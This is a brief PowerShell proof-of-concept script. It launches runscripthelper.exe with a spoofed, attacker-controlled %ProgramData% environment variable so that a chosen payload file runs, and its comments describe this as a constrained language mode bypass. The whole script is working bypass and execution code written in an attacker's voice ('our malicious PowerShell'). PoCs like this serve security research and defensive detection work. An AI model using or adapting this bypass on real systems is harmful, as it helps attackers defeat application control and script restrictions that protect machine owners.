# Place the payload you want to execute in C:\Test\Microsoft\Diagnosis\scripts\evil.txt
# The filename can be any name and extension you want. It doesn't have to be .ps1. Hehe.
# This PoC is also a constrained language mode bypass...

# Gather up all existing environment variables except %ProgramData%. We're going to supply our own, attacker controlled path.
[String[]] $AllEnvVarsExceptLockdownPolicy = Get-ChildItem Env:\* -Exclude 'ProgramData' | % { "$($_.Name)=$($_.Value)" }
# Attacker-controlled %ProgramData% being passed to the child process.
$AllEnvVarsExceptLockdownPolicy += 'ProgramData=C:\Test'

$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property @{
    EnvironmentVariables = $AllEnvVarsExceptLockdownPolicy
}

# Give runscripthelper.exe what it needs to execute our malicious PowerShell.
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = 'C:\Windows\System32\runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\evil.txt C:\Test'
    ProcessStartupInformation = $StartParams
}
